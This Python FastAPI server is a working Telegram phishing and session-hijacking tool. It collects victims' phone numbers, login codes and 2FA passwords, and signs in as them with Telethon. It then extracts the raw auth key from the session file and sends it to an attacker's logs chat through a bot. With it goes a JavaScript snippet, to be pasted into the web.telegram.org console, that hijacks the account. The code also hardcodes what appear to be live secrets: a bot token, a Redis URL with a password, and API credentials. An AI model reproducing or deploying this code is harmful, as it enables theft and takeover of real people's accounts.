import os, sqlite3
from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import redis.asyncio as redis
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError
import httpx
from dotenv import load_dotenv

load_dotenv()

BOT_TOKEN = "8268855870:AAESvySbXCEhgG-Bk0mvipt3UUuuqdbLqmY"
REDIS_URL = "redis://default:GT9rAOc9TZhb4FMvlSikZJ8K6cy1ffB0@redis-10623.c265.us-east-1-2.ec2.cloud.redislabs.com:10623"
API_ID = 2496
API_HASH = "8da85b0d5bfe62527e5b244c209159c3"

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

r = redis.from_url(REDIS_URL, decode_responses=True)
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"


class SendCodeRequest(BaseModel):
    phone: str

class VerifyCodeRequest(BaseModel):
    phone: str
    code: str
    password: str | None = None


def get_session_path(phone: str) -> str:
    return f"session_{phone.replace(' ', '_').replace('+', '')}"


async def send_telegram_message(chat_id: int, text: str):
    async with httpx.AsyncClient() as client:
        await client.post(f"{TELEGRAM_API}/sendMessage", json={
            "chat_id": chat_id,
            "text": text,
            "parse_mode": "Markdown",
        })


async def export_key_and_notify(phone: str):
    logs_chat_id = await r.get("logs_chat_id")
    if not logs_chat_id:
        return

    session_name = get_session_path(phone)
    session_file = session_name + ".session"

    # Read the key Telethon saved during sign_in
    dc_key = None
    dc_id_used = None

    if os.path.exists(session_file):
        conn = sqlite3.connect(session_file)
        cur = conn.cursor()
        cur.execute("SELECT dc_id, auth_key FROM sessions")
        rows = cur.fetchall()
        conn.close()
        for row in rows:
            if row[1]:
                dc_key = row[1].hex()
                dc_id_used = row[0]
                break

    # Get user info
    user_id = "unknown"
    first_name = ""
    last_name = ""
    client = TelegramClient(session_name, API_ID, API_HASH)
    try:
        await client.connect()
        me = await client.get_me()
        user_id = me.id
        first_name = me.first_name or ""
        last_name = me.last_name or ""
    except Exception:
        pass
    finally:
        await client.disconnect()

    if not dc_key:
        await send_telegram_message(int(logs_chat_id),
            f"*Login captured but key export failed*\nPhone: `{phone}`\nUser ID: `{user_id}`"
        )
        return

    fingerprint = dc_key[:8]

    injection_code = (
        f"localStorage.clear();\n"
        f"const authKey = \"{dc_key}\";\n"
        f"const userId = {user_id};\n"
        f"const now = Math.floor(Date.now() / 1000);\n"
        f"const dc = {dc_id_used};\n"
        f"const req = indexedDB.open('tweb-account-1', 9);\n"
        f"req.onsuccess = function(e) {{\n"
        f"  const db = e.target.result;\n"
        f"  const tx = db.transaction(['session'], 'readwrite');\n"
        f"  const store = tx.objectStore('session');\n"
        f"  store.put({{_: 'authStateSignedIn'}}, 'authState');\n"
        f"  store.put(dc, 'dc');\n"
        f"  store.put(authKey, 'dc' + dc + 'AuthKey');\n"
        f"  store.put('0000000000000000', 'dc' + dc + 'ServerSalt');\n"
        f"  store.put(userId, 'userId');\n"
        f"  tx.oncomplete = () => {{\n"
        f"    localStorage.setItem('dc', String(dc));\n"
        f"    localStorage.setItem('dc' + dc + '_auth_key', authKey);\n"
        f"    localStorage.setItem('user_auth', JSON.stringify({{dcID: dc, date: now, id: userId}}));\n"
        f"    localStorage.setItem('auth_key_fingerprint', '{fingerprint}');\n"
        f"    location.reload();\n"
        f"  }};\n"
        f"}};"
    )

    header = (
        f"*New session captured!*\n"
        f"Phone: `{phone}`\n"
        f"Name: {first_name} {last_name}\n"
        f"User ID: `{user_id}`\n"
        f"DC: `{dc_id_used}`\n\n"
        f"*Paste in web.telegram.org/k console (F12):*\n"
    )

    full_message = header + f"```\n{injection_code}\n```"
    if len(full_message) > 4096:
        await send_telegram_message(int(logs_chat_id), header)
        chunk = f"```\n{injection_code}\n```"
        for i in range(0, len(chunk), 3800):
            await send_telegram_message(int(logs_chat_id), chunk[i:i+3800])
    else:
        await send_telegram_message(int(logs_chat_id), full_message)


@app.post("/send-code")
async def send_code(req: SendCodeRequest):
    rate_key = f"rate:{req.phone}"
    attempts = await r.incr(rate_key)
    if attempts == 1:
        await r.expire(rate_key, 600)
    if attempts > 3:
        raise HTTPException(status_code=429, detail="Too many attempts. Please wait 10 minutes.")

    client = TelegramClient(get_session_path(req.phone), API_ID, API_HASH)
    await client.connect()

    try:
        result = await client.send_code_request(req.phone)
        await r.setex(f"hash:{req.phone}", 300, result.phone_code_hash)
    except Exception as e:
        await client.disconnect()
        raise HTTPException(status_code=400, detail=str(e))

    await client.disconnect()

    logs_chat_id = await r.get("logs_chat_id")
    if logs_chat_id:
        await send_telegram_message(int(logs_chat_id),
            f"*New verification attempt*\nPhone: `{req.phone}`"
        )

    return {"ok": True}


@app.post("/verify-code")
async def verify_code(req: VerifyCodeRequest):
    phone_code_hash = await r.get(f"hash:{req.phone}")
    if not phone_code_hash:
        raise HTTPException(status_code=400, detail="Code expired. Please request a new one.")

    client = TelegramClient(get_session_path(req.phone), API_ID, API_HASH)
    await client.connect()

    try:
        await client.sign_in(
            phone=req.phone,
            code=req.code,
            phone_code_hash=phone_code_hash
        )
    except SessionPasswordNeededError:
        if not req.password:
            await client.disconnect()
            raise HTTPException(status_code=428, detail="2FA password required")
        try:
            await client.sign_in(password=req.password)
        except Exception:
            await client.disconnect()
            raise HTTPException(status_code=400, detail="Invalid 2FA password")
    except PhoneCodeInvalidError:
        await client.disconnect()
        raise HTTPException(status_code=400, detail="Incorrect code. Please try again.")
    except PhoneCodeExpiredError:
        await client.disconnect()
        raise HTTPException(status_code=400, detail="Code expired. Please request a new one.")
    except Exception as e:
        await client.disconnect()
        raise HTTPException(status_code=400, detail=str(e))

    await client.disconnect()
    await r.delete(f"hash:{req.phone}")

    await export_key_and_notify(req.phone)

    return {"ok": True, "message": "Logged in successfully"}
